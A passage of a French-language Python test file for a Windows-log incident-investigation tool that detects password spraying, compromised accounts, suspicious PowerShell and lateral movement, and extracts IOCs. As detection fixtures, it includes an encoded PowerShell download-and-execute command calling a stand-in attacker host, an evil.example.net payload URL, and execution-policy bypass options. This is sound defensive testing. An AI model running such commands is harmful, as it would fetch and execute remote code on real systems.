            self.assertEqual(decoder_commande(ligne), "Get-Process", option)
            self.assertTrue(_marqueurs_presents(f"powershell.exe {option} {B64_IEX}"), option)

    def test_option_ec_seule_suspecte(self):
        q = TestEtape3._nature_proc(self, "powershell.exe", "cmd.exe",
                                    "powershell.exe -ec " + B64_IEX)
        self.assertEqual(q.nature, "processus_suspect")
        self.assertEqual(q.commande_decodee, "IEX")

    def test_bypass_et_noprofile_abrege(self):
        for ligne in ("powershell.exe -ExecutionPolicy Bypass -File a.ps1",
                      "powershell.exe -NoProfile -File a.ps1",
                      "powershell.exe -nopr -File a.ps1"):
            self.assertTrue(_marqueurs_presents(ligne), ligne)

    def test_pas_de_faux_positif_options(self):
        for ligne in ("cmd.exe /c start -nopause", "xcopy.exe /e C:\\a D:\\b",
                      "findstr.exe -e motif fichier.txt", "powershell.exe -no a.ps1",
                      "powershell.exe -ExecutionPolicy RemoteSigned -File a.ps1"):
            self.assertFalse(_marqueurs_presents(ligne), ligne)
        self.assertIsNone(decoder_commande("xcopy.exe /e C:\\a D:\\b"))

    # Finding 3 : commandes des comptes suivis
    def test_commande_du_compte_compromis_suspecte(self):
        *_, chronos = self._etapes([TestEtape3._proc(
            "2026-05-20T09:20:00Z", "SRV-FILE02", "u.trois", "cmd.exe", "explorer.exe",
            "cmd.exe /c whoami")])
        q = self._a(chronos[0], "09:20")[0]
        self.assertEqual(q.nature, "processus_suspect")
        self.assertTrue(q.suspect)
        self.assertIn("commande exécutée par le compte compromis u.trois "
                      "(aucun marqueur connu)", q.description)

    def test_commande_du_compte_cree_suspecte(self):
        *_, chronos = self._etapes([TestEtape3._proc(
            "2026-05-20T09:30:00Z", "WKS-205", "adm_tmp", "cmd.exe", "explorer.exe",
            "cmd.exe /c whoami")])
        q = self._a(chronos[0], "09:30")[0]
        self.assertTrue(q.suspect)
        self.assertIn("par le compte créé par l'attaquant adm_tmp", q.description)

    def test_commande_autre_compte_neutre(self):
        *_, chronos = self._etapes([TestEtape3._proc(
            "2026-05-20T09:20:00Z", "SRV-FILE02", "m.legit", "notepad.exe", "explorer.exe")])
        q = self._a(chronos[0], "09:20")[0]
        self.assertEqual(q.nature, "processus_benin")
        self.assertFalse(q.suspect)
        self.assertIn("aucun marqueur suspect", q.description)
        self.assertNotIn("sans anomalie", q.description)

    def test_qualifier_evenement_compatible(self):
        evts, det, piv, _ = self._etapes()
        c = piv.compromissions[0]
        e = Evenement(c.t0, 4688, c.host, "autre", None, None, "",
                      {"process": "notepad.exe", "parent_process": "explorer.exe"})
        self.assertEqual(qualifier_evenement(e, c).nature, "processus_benin")

    def test_plan_commande_sans_marqueur(self):
        evts, det, piv, chronos = self._etapes([
            TestEtape3._proc("2026-05-20T09:20:00Z", "SRV-FILE02", "u.trois", "cmd.exe",
                             "explorer.exe", "cmd.exe /c whoami"),
            TestEtape3._proc("2026-05-20T09:21:00Z", "SRV-FILE02", "u.trois", "cmd.exe",
                             "explorer.exe", "cmd.exe /c ipconfig")])
        actions = [a for a in etape4_plan(det, piv, chronos)
                   if "u.trois" in a.action and "Collecter" in a.action]
        self.assertEqual(len(actions), 1)
        self.assertEqual(actions[0].priorite, "COURT TERME")
        self.assertIn("SRV-FILE02", actions[0].action)

    # Finding 4 : connexion interactive sur une autre machine
    def test_connexion_interactive_a_verifier(self):
        evts, det, piv, chronos = self._etapes([
            _brut("2026-05-20T18:05:00Z", 4624, "LAP-007", "u.trois", "10.8.3.3", 2)])
        q = self._a(chronos[0], "18:05")[0]
        self.assertEqual(q.nature, "connexion_a_verifier")
        self.assertTrue(q.suspect)
        self.assertIn("connexion interactive du compte compromis u.trois sur LAP-007 : "
                      "à vérifier (poste habituel de l'utilisateur ?)", q.description)
        actions = etape4_plan(det, piv, chronos)
        self.assertFalse(any("Isoler LAP-007" in a.action for a in actions))
        verif = [a for a in actions
                 if a.action == "Vérifier auprès de l'utilisateur la connexion sur LAP-007 à 18:05"]
        self.assertEqual([a.priorite for a in verif], ["COURT TERME"])
        from iocs import extraire_iocs
        self.assertNotIn(("target-machine", "LAP-007"),
                         {(i.type_misp, i.valeur) for i in extraire_iocs(det, piv, chronos)})

    def test_gravite_connexion_a_verifier_seule(self):
        # sans les faits graves du jeu, la seule connexion interactive ne rend pas CRITIQUE
        evts, det, piv, chronos = self._etapes([
            _brut("2026-05-20T18:05:00Z", 4624, "LAP-007", "u.trois", "10.8.3.3", 2)])
        for ch in chronos:
            ch.evenements = [q for q in ch.evenements if q.nature == "connexion_a_verifier"]
        self.assertEqual(evaluer_gravite(piv, chronos), "ÉLEVÉE")

    def test_connexion_reseau_et_type_inconnu_laterales(self):
        *_, chronos = self._etapes([
            _brut("2026-05-20T18:05:00Z", 4624, "SRV-X1", "u.trois", "10.8.3.3", 3),
            _brut("2026-05-20T18:06:00Z", 4624, "SRV-X2", "u.trois", "10.8.3.3", None)])
        self.assertEqual(self._a(chronos[0], "18:05")[0].nature, "mouvement_lateral")
        self.assertEqual(self._a(chronos[0], "18:06")[0].nature, "mouvement_lateral")

    # Finding 5 : formulation de l'étape 2
    def test_etape2_compte_vise_ou_non(self):
        _, _, piv, _ = self._etapes([
            TestEtape2._succes("2026-05-20T09:13:00Z", "SRV-APP9", "admin.local", IP_SPRAY_A)])
        t = expliquer_etape2(piv, False)
        self.assertNotIn("un compte deviné par l'attaquant", t)
        self.assertIn("probablement deviné", t)
        self.assertIn("compte qui ne figurait pas parmi les comptes visés par les échecs", t)

    # Finding 6 et 7 : échecs sans IP, accords
    def test_echecs_sans_ip_comptes_et_mentionnes(self):
        chemin = ecrire_tmp([
            {"timestamp": "2026-05-20T10:00:00Z", "event_id": 4625, "src_ip": v,
             "account": "a"} for v in (None, "", "-", "  ")]
            + [{"timestamp": "2026-05-20T10:00:00Z", "event_id": 4624, "src_ip": " - "}])
        self.addCleanup(os.remove, chemin)
        evts = charger_logs(chemin)
        self.assertEqual([e.src_ip for e in evts], [None] * 5)
        det = etape1_detection(evts)
        self.assertEqual(det.nb_echecs_sans_ip, 4)
        self.assertIn("4 échecs sans IP source, non attribuables",
                      expliquer_etape1(det, False))
        self.assertNotIn("sans IP source", expliquer_etape1(etape1_detection([]), False))

    def test_accord_nombre_echecs(self):
        self.assertIn("Résultat : 0 échec de connexion analysé,",
                      expliquer_etape1(etape1_detection([]), False))
        un = [Evenement(datetime(2026, 5, 20, tzinfo=timezone.utc), 4625, "H", "a",
                        "198.51.100.9", 3, "", {})]
        self.assertIn("1 échec de connexion analysé,", expliquer_etape1(etape1_detection(un), False))

    # Finding 10 : nouvelle connexion depuis l'IP d'attaque
    def test_nouvelle_connexion_depuis_ip_attaque(self):
        *_, chronos = self._etapes([
            TestEtape2._succes("2026-05-20T09:40:00Z", "SRV-FILE02", "u.trois", IP_SPRAY_A)])
        q = self._a(chronos[0], "09:40")[0]
        self.assertTrue(q.suspect)
        self.assertIn(f"nouvelle connexion de u.trois depuis l'IP d'attaque {IP_SPRAY_A}",
                      q.description)

    # Finding 11 : libellés français à l'étape 5
    def test_etape5_libelles_francais(self):
        iocs = [IOC("198.51.100.23", "ip-src", "Network activity", True, "IP",
                    role="ip_attaque"),
                IOC("adm_tmp", "text", "Persistence mechanism", False, "c", role="compte_cree"),
                IOC("u.trois", "target-user", "Targeting data", False, "c",
                    role="compte_compromis")]
        t = expliquer_etape5(iocs, None)
        self.assertIn("  - adm_tmp  (compte créé)", t)
        self.assertIn("  - u.trois  (compte compromis)", t)
        self.assertIn("1 IP d'attaque, 1 compte créé, 1 compte compromis.", t)
        iocs.append(IOC("v.deux", "target-user", "Targeting data", False, "c",
                        role="compte_compromis"))
        self.assertIn("2 comptes compromis", expliquer_etape5(iocs, None))
        for brut in ("(text)", "(target-user)", "(ip-src)", " text ", "ip-src"):
            self.assertNotIn(brut, t)

    # Finding 12 : en-tête du module
    def test_docstring_module(self):
        import investigation
        doc = investigation.__doc__
        self.assertNotIn("rebond latéral", doc)
        for attendu in ("1.", "2.", "3.", "4.", "5.", "python3 investigation.py",
                        "--enrichir", "Paramètres"):
            self.assertIn(attendu, doc)


class TestRevueFinaleBoutEnBout(_DossierTemporaire):
    def test_investiguer_transmet_est_interne_et_multi_jours(self):
        import investigation
        with mock.patch.object(investigation, "extraire_iocs", return_value=[]) as m:
            investiguer(self.jeu())
        self.assertIs(m.call_args.kwargs["est_interne"], investigation.est_interne)
        self.assertIs(m.call_args.kwargs["multi_jours"], False)

    def test_utilisateur_legitime_sans_ioc_reseau(self):
        legit = _brut("2026-05-20T09:35:00Z", 4688, "SRV-FILE02", "m.legit",
                      process="chrome.exe", parent_process="explorer.exe",
                      command_line="chrome.exe https://intranet.exemple.fr/rh 10.0.5.5")
        inv = investiguer(self.jeu(construire_jeu() + [legit]))
        valeurs = {i.valeur for i in inv.iocs}
        for v in ("https://intranet.exemple.fr/rh", "intranet.exemple.fr", "10.0.5.5"):
            self.assertNotIn(v, valeurs)
        self.assertIn("http://evil.example.net/p.exe", valeurs)



# --- Corrections résiduelles -------------------------------------------------
import base64 as _b64


def _enc(texte):
    return _b64.b64encode(texte.encode("utf-16-le")).decode()


class TestResiduelIOCSansMarqueur(_DossierTemporaire):
    """Finding 1 : pas d'URL/domaine/IP extraits d'une commande sans marqueur."""

    def test_commande_intranet_du_compte_compromis_sans_ioc_reseau(self):
        chrome = _brut("2026-05-20T09:35:00Z", 4688, "SRV-FILE02", "u.trois",
                       process="chrome.exe", parent_process="explorer.exe",
                       command_line="chrome.exe https://intranet.acme.fr/rh --proxy=10.0.5.5 "
                                    "198.51.100.77")
        inv = investiguer(self.jeu(construire_jeu() + [chrome]))
        q = [q for ch in inv.chronos for q in ch.evenements
             if q.evt.timestamp.strftime("%H:%M") == "09:35"][0]
        self.assertTrue(q.suspect and q.sans_marqueur)   # toujours dans la chronologie
        reseau = {(i.type_misp, i.valeur) for i in inv.iocs
                  if i.type_misp in ("url", "domain", "ip-dst")}
        for v in ("https://intranet.acme.fr/rh", "intranet.acme.fr", "acme.fr",
                  "10.0.5.5", "198.51.100.77"):
            self.assertFalse(any(val == v for _, val in reseau), v)
        # ni la ligne de commande elle-même (pas un indicateur réutilisable)
        self.assertFalse(any("intranet.acme.fr" in i.valeur for i in inv.iocs))
        # la vraie commande suspecte (certutil lancé par excel) garde ses IOC
        self.assertIn(("url", "http://evil.example.net/p.exe"), reseau)
        self.assertIn(("domain", "evil.example.net"), reseau)

    def test_commande_encodee_vers_url_conservee(self):
        cmd = ("powershell.exe -enc "
               + _enc("IEX (New-Object Net.WebClient).DownloadString('http://evil2.example.org/a.ps1')"))
        ps = _brut("2026-05-20T09:36:00Z", 4688, "SRV-FILE02", "u.trois",
                   process="powershell.exe", parent_process="explorer.exe",
                   command_line=cmd)
        inv = investiguer(self.jeu(construire_jeu() + [ps]))
        paires = {(i.type_misp, i.valeur) for i in inv.iocs}
        self.assertIn(("url", "http://evil2.example.org/a.ps1"), paires)
        self.assertIn(("domain", "evil2.example.org"), paires)
        self.assertIn(("text", cmd), paires)


class TestResiduelCasse(_DossierTemporaire):
    """Finding 2 : comptes et machines Windows insensibles à la casse."""
    IP = "198.51.100.66"

    @staticmethod
    def _t(m, s=0):
        return f"2026-05-21T10:{m:02d}:{s:02d}Z"

    def _echecs(self, comptes, n=12, host="WKS-014"):
        return [_brut(self._t(0, i * 2), 4625, host, comptes[i % len(comptes)],
                      self.IP, 3) for i in range(n)]

    def test_spray_meme_compte_casse_differente(self):
        evts = charger_logs(self.jeu(self._echecs(["J.Martin", "j.martin"])))
        det = etape1_detection(evts)
        self.assertEqual([(p.categorie, p.comptes) for p in det.suspectes],
                         [("force_brute", ["J.Martin"])])
        # 4 comptes + une variante de casse : sous le seuil de 5 comptes
        evts = charger_logs(self.jeu(self._echecs(["a", "b", "c", "J.Martin", "j.martin"])))
        p = etape1_detection(evts).suspectes[0]
        self.assertEqual((p.categorie, len(p.comptes)), ("force_brute", 4))

    def test_compromission_et_chronologie_casse_differente(self):
        evts = self._echecs(["j.martin", "a", "b", "c", "d"], host="WKS-014") + [
            _brut(self._t(5), 4624, "wks-014", "J.MARTIN", self.IP, 3),
            _brut(self._t(6), 4624, "WKS-014", "j.martin", self.IP, 3),
            _brut(self._t(7), 4688, "WKS-014", "J.Martin", process="cmd.exe",
                  parent_process="explorer.exe", command_line="cmd.exe /c whoami"),
            _brut(self._t(8), 4624, "Wks-014", "j.martin", "10.9.9.9", 3),
            _brut(self._t(9), 4698, "SRV-X", "j.MARTIN", task_name="\\Maj")]
        inv = investiguer(self.jeu(evts))
        self.assertEqual([(c.compte, c.host) for c in inv.piv.compromissions],
                         [("J.MARTIN", "wks-014")])
        t2 = expliquer_etape2(inv.piv, False)
        self.assertIn("mot de passe probablement deviné", t2)
        natures = [(q.evt.timestamp.strftime("%M"), q.nature) for q in inv.chronos[0].evenements]
        self.assertEqual(natures, [("05", "connexion_initiale"), ("06", "connexion"),
                                   ("07", "processus_suspect"), ("08", "connexion"),
                                   ("09", "tache_planifiee")])
        q7 = inv.chronos[0].evenements[2]
        self.assertIn("le compte compromis J.Martin", q7.description)
        self.assertEqual(inv.chronos[0].comptes_suivis, ["J.MARTIN"])
        cibles = [(i.type_misp, i.valeur) for i in inv.iocs
                  if i.type_misp in ("target-user", "target-machine")]
        self.assertEqual(cibles, [("target-user", "J.MARTIN"), ("target-machine", "wks-014")])

    def test_plan_machine_casse_differente_une_action(self):
        evts = self._echecs(["u1", "u2", "u3", "u4", "u5"]) + [
            _brut(self._t(5), 4624, "WKS-014", "u1", self.IP, 3),
            _brut(self._t(6), 4624, "wks-014", "u2", self.IP, 3)]
        inv = investiguer(self.jeu(evts))
        self.assertEqual(len(inv.piv.compromissions), 2)
        isoler = [a.action for a in inv.actions if a.action.startswith("Isoler")]
        self.assertEqual(isoler, ["Isoler WKS-014 du réseau"])
        self.assertIn("connecté avec succès à WKS-014,",
                      expliquer_etape4(inv.actions, inv.gravite, inv.piv, inv.chronos))

    def test_membre_ajoute_casse_differente_suivi(self):
        evts = self._echecs(["u1", "u2", "u3", "u4", "u5"]) + [
            _brut(self._t(5), 4624, "WKS-014", "u1", self.IP, 3),
            _brut(self._t(6), 4720, "WKS-014", "u1", new_account="svc_backup"),
            _brut(self._t(7), 4720, "WKS-014", "u1", new_account="SVC_Backup"),
            _brut(self._t(8), 4732, "DC-01", "Administrateur",
                  group="Admins du domaine", member="SVC_BACKUP"),
            _brut(self._t(9), 4624, "SRV-Y", "Svc_Backup", "10.9.9.9", 3)]
        inv = investiguer(self.jeu(evts))
        ch = inv.chronos[0]
        self.assertEqual(ch.comptes_suivis, ["u1", "svc_backup"])
        natures = [q.nature for q in ch.evenements]
        self.assertEqual(natures.count("ajout_groupe_privilegie"), 1)
        self.assertIn("mouvement_lateral", natures)
        retirer = [a for a in inv.actions if a.action.startswith("Retirer SVC_BACKUP")]
        self.assertEqual(len(retirer), 1)
        crees = [i.valeur for i in inv.iocs if i.role == "compte_cree"]
        self.assertEqual(crees, ["svc_backup"])


if __name__ == "__main__":
    unittest.main()
